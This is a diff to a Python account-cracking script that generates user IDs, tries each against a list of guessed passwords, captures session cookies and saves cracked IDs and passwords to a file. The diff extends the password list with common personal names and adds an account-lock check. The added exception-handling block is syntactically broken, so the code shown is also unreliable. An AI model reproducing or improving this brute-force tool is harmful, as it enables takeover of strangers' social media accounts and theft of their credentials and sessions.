@@ -233,7 +233,7 @@ def ASRAF():
 		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','jannat','tamanna','sadiya']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','jannat','tamanna','sadiya','nusrat','farjana','shakil','ayesha','shopna','xxxxxx']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [💉] Crack process has been completed')
@@ -289,6 +289,12 @@ def b(uid,pwx,tl):
                 print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                 oks.append(cid)
                 open('/sdcard/ASRAF-OK💥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+            try:
+            	uid=reqs['uid']
+            except 
+                 uid=ids
+             ckkx=lock_check(uid)
+             if ckkx =='LOCK':	
                 break
             else:
                 continue
